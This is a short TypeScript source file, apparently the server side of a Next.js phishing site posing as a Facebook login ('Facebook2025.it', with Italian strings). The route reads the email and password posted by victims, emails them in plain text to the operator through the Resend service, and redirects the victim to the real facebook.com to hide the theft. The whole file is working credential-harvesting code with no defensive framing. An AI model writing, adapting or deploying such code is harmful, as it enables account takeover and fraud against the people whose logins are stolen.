import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const email = formData.get('email') || 'N/A';
    const password = formData.get('password') || 'N/A';
    const timestamp = new Date().toLocaleString('it-IT');

    const emailTo = process.env.EMAIL_TO;

    const message = `
📩 Nuovo accesso su Facebook2025.it

🕓 Orario: ${timestamp}
📧 Email: ${email}
🔐 Password: ${password}
`;

    await resend.emails.send({
      from: 'facebook2025@grisu.it', // puoi personalizzarlo
      to: emailTo!,
      subject: 'Nuovo login da Facebook2025',
      text: message,
    });

    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error(error);
    return new NextResponse('Errore interno.', { status: 500 });
  }
}
